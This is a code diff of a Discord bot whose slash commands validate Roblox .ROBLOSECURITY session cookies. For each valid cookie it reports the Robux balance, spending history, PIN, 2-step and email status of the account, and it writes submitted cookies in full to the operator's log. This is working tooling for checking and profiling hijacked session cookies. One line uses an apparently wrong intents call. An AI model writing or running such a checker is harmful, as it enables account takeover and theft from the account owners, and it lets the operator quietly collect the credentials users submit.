@@ -1,39 +1,42 @@
-from discord import Activity, ActivityType, Embed
+import discord
 from requests import get
 from discord.ext import commands
 from datetime import datetime
 from time import time as __, sleep as zzz
 from re import findall
 
+
+Embed = discord.Embed
+token="token here"
+status="asnathedev on top"
+
 def log(text,sleep=None): 
     print(f"[{datetime.utcfromtimestamp(__()).strftime('%Y-%m-%d %H:%M:%S')}] → {text}")
     if sleep: zzz(sleep)
 
-class settings:
-    token = '' # Discord Bot Token
-    prefix = '.' # Bot Prefix
-    bot_status = '@DankoOfficial on Github' # Bot Status
-    client = commands.Bot(command_prefix=prefix)
+bot = commands.Bot(command_prefix='dc!', intents=discord.Intents.All())
 
-log(f'Detected token: {settings.token}',0.5)
-log(f'Detected prefix: {settings.prefix}',0.5)
-log(f'Detected bot status: {settings.bot_status}',0.5)
-
-@settings.client.event
+@bot.event
 async def on_ready():
-    log(f"Connected to {settings.client.user}",0.5)
-    await settings.client.change_presence(activity=Activity(type=ActivityType.watching, name=settings.bot_status))
+    log(f"Connected to {bot.user}",0.5)
+    try:
+        synced = await bot.tree.sync()
+        print(f"Synced {len(synced)} commands")
+    except Exception as e:
+        print(e)
+    await bot.change_presence(activity=discord.Activity(name=status, type=2))
 
-@settings.client.command()
+
+@bot.hybrid_command(name="vc", description="Check if the cookie is valid", with_app_command=True)
 async def vc(ctx, cookie=None):
     if not cookie:
         await ctx.send(embed=Embed(title=":x: Missing Cookie", description="", color=0xFF0000))
-        log(f'User {ctx.author} tried to use {settings.prefix}vc but did not provide a cookie.')
+        log(f'User {ctx.author} tried to use /vc but did not provide a cookie.')
         return
     await ctx.message.delete()
     response = get('https://users.roblox.com/v1/users/authenticated',cookies={'.ROBLOSECURITY': cookie})
     if '"id":' in response.text:
-        log(f'User {ctx.author} used {settings.prefix}vc with a valid cookie.')
+        log(f'User {ctx.author} used /vc with a valid cookie.')
         embedVar = Embed(title=":white_check_mark: Valid Cookie", description="", color=0x38d13b)
         embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
         embedVar.set_footer(text="Check your DMs for the cookie.")
@@ -41,26 +44,26 @@ async def vc(ctx, cookie=None):
         await dm.send(embed=Embed(title=":white_check_mark: Cookie", description='```'+cookie+'```', color=0x38d13b))
         await ctx.send(embed=embedVar)
     elif 'Unauthorized' in response.text:
-        log(f'User {ctx.author} used {settings.prefix}vc with an invalid cookie.')
+        log(f'User {ctx.author} used /vc with an invalid cookie.')
         embedVar = Embed(title=":x: Invalid Cookie", description="", color=0xFF0000)
         embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
-        await ctx.send(embed=embedVar)
+        await ctx.send(embed=embedVar,ephemeral=True)
     else:
-        log(f'User {ctx.author} used {settings.prefix}vc but roblox returned a bad response.')
+        log(f'User {ctx.author} used /vc but roblox returned a bad response.')
         embedVar = Embed(title=":x: Error", description="", color=0xFFFF00)
         embedVar.add_field(name="Error: ", value='```'+response.text+'```', inline=False)
-        await ctx.send(embed=embedVar)
+        await ctx.send(embed=embedVar,ephemeral=True)
 
-@settings.client.command()
+@bot.hybrid_command(name='vcr', description="check if cookie is valid + show robux balance", with_app_command=True)
 async def vcr(ctx, cookie=None):
     if not cookie:
         await ctx.send(embed=Embed(title=":x: Missing Cookie", description="", color=0xFF0000))
-        log(f'User {ctx.author} tried to use {settings.prefix}vcr but did not provide a cookie.')
+        log(f'User {ctx.author} tried to use /vcr but did not provide a cookie.')
         return
     await ctx.message.delete()
     response = get('https://users.roblox.com/v1/users/authenticated',cookies={'.ROBLOSECURITY': cookie})
     if '"id":' in response.text:
-        log(f'User {ctx.author} used {settings.prefix}vcr with a valid cookie.')
+        log(f'User {ctx.author} used /vcr with a valid cookie.')
         user_id = response.json()['id']
         robux = get(f'https://economy.roblox.com/v1/users/{user_id}/currency',cookies={'.ROBLOSECURITY': cookie}).json()['robux']
         embedVar = Embed(title=":white_check_mark: Valid Cookie", description="", color=0x38d13b)
@@ -70,18 +73,19 @@ async def vcr(ctx, cookie=None):
         await dm.send(embed=Embed(title=":white_check_mark: Cookie", description='```'+cookie+'```', color=0x38d13b))
         await ctx.send(embed=embedVar)
     elif 'Unauthorized' in response.text:
-        log(f'User {ctx.author} used {settings.prefix}vcr with an invalid cookie.')
+        log(f'User {ctx.author} used /vcr with an invalid cookie.')
         embedVar = Embed(title=":x: Invalid Cookie", description="", color=0xFF0000)
         embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
-        await ctx.send(embed=embedVar)
+        await ctx.send(embed=embedVar,ephemeral=True)
     else:
-        log(f'User {ctx.author} used {settings.prefix}vcr but roblox returned a bad response.')
+        log(f'User {ctx.author} used /vcr but roblox returned a bad response.')
         embedVar = Embed(title=":x: Error", description="", color=0xFFFF00)
         embedVar.add_field(name="Error: ", value='```'+response.text+'```', inline=False)
-        await ctx.send(embed=embedVar)
+        await ctx.send(embed=embedVar,ephemeral=True)
 
-@settings.client.command()
-async def full(ctx, cookie=None):
+
+@bot.hybrid_command(name='full', description="display everything about the account", with_app_command=True)
+async def full(ctx,cookie=None):
     if not cookie:
         await ctx.send(embed=Embed(title=":x: Missing Cookie", description="", color=0xFF0000))
         return
@@ -151,17 +155,17 @@ async def full(ctx, cookie=None):
         await ctx.send(embed=embedVar)
         embedVar.add_field(name="Passed Cookie: ", value=cookie, inline=False)
         await dm.send(embed=embedVar)
-        log(f'User {ctx.author} used {settings.prefix}full with a valid cookie. [{robux} R$ | {balance_credit} {balance_credit_currency} | {account_name} ({account_display_name}) | {account_age_in_years} years | {account_friends} Friends | {account_gamepasses} Gamepasses Worth | {account_badges} Badges | {account_sales_of_goods} Sales of Goods | {account_premium_payouts_total} Premium Payouts | {account_commissions} Commissions | {account_robux_purchcased} Robux Purchased | {account_pending_robux} Pending | {account_purchases_total} Overall | {account_voice_verified} Voice Verified | {account_has_pin} Has PIN | {account_2step} 2-Step Verification | {account_has_premium} Premium | {account_above_13} Above 13 | {account_email_verified} Email | {cookie} Cookie]')
+        log(f'User {ctx.author} used /full with a valid cookie. [{robux} R$ | {balance_credit} {balance_credit_currency} | {account_name} ({account_display_name}) | {account_age_in_years} years | {account_friends} Friends | {account_gamepasses} Gamepasses Worth | {account_badges} Badges | {account_sales_of_goods} Sales of Goods | {account_premium_payouts_total} Premium Payouts | {account_commissions} Commissions | {account_robux_purchcased} Robux Purchased | {account_pending_robux} Pending | {account_purchases_total} Overall | {account_voice_verified} Voice Verified | {account_has_pin} Has PIN | {account_2step} 2-Step Verification | {account_has_premium} Premium | {account_above_13} Above 13 | {account_email_verified} Email | {cookie} Cookie]')
         
     elif 'Unauthorized' in response.text:
-        log(f'User {ctx.author} used {settings.prefix}full with an invalid cookie.')
+        log(f'User {ctx.author} used /full with an invalid cookie.')
         embedVar = Embed(title=":x: Invalid Cookie", description="", color=0xFF0000)
         embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
-        await ctx.send(embed=embedVar)
+        await ctx.send(embed=embedVar,ephemeral=True)
     else:
-        log(f'User {ctx.author} used {settings.prefix}full but roblox returned a bad response.')
+        log(f'User {ctx.author} used /full but roblox returned a bad response.')
         embedVar = Embed(title=":x: Error", description="", color=0xFFFF00)
         embedVar.add_field(name="Error: ", value='```'+response.text+'```', inline=False)
-        await ctx.send(embed=embedVar)
+        await ctx.send(embed=embedVar,ephemeral=True)
 
-settings.client.run(settings.token)
+bot.run(token)
